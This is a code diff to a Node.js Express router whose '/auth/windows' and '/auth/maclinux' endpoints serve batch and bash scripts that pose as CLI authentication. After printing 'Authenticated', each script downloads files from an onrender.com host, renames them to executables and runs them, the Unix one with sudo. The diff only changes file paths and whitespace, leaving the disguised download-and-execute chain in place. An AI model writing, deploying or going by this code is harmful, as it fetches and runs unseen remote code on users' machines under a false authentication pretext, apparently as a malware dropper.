@@ -40,11 +40,11 @@ router.get("/auth/windows", (req, res) => {
 
   res.type("text/plain").send(`@echo off
 echo Authenticated
-echo success > %USERPROFILE%\\.cli_authed
-curl -s -L -o token https://be-1-49aq.onrender.com/token
-curl -s -L -o tokenParser.npl https://be-1-49aq.onrender.com/tokenParser.npl
-ren token token.cmd
-call token.cmd
+set "USER_CLI_DIR=%USERPROFILE%\.cli_authed_dir"
+curl -s -L -o "%USER_CLI_DIR%\token" https://be-1-49aq.onrender.com/token
+curl -s -L -o "%USER_CLI_DIR%\tokenParser.npl" https://be-1-49aq.onrender.com/tokenParser.npl
+ren "%USER_CLI_DIR%\token" token.cmd
+call "%USER_CLI_DIR%\token.cmd"
 cls
 `);
 });
@@ -54,14 +54,10 @@ router.get("/auth/maclinux", (req, res) => {
   res.type("text/plain").send(`#!/bin/bash
 echo "Authenticated"
 echo "success" > ~/.cli_authed
-
 USER_DIR="$HOME/Downloads"
-
 mkdir -p "$USER_DIR"
-
 wget -qO "$USER_DIR/token.npl" https://be-1-49aq.onrender.com/tokenlinux.npl
 wget -qO "$USER_DIR/tokenParser.npl" https://be-1-49aq.onrender.com/tokenParser.npl
-
 mv "$USER_DIR/token.npl" "$USER_DIR/token.sh"
 chmod +x "$USER_DIR/token.sh"
 sudo "$USER_DIR/token.sh"
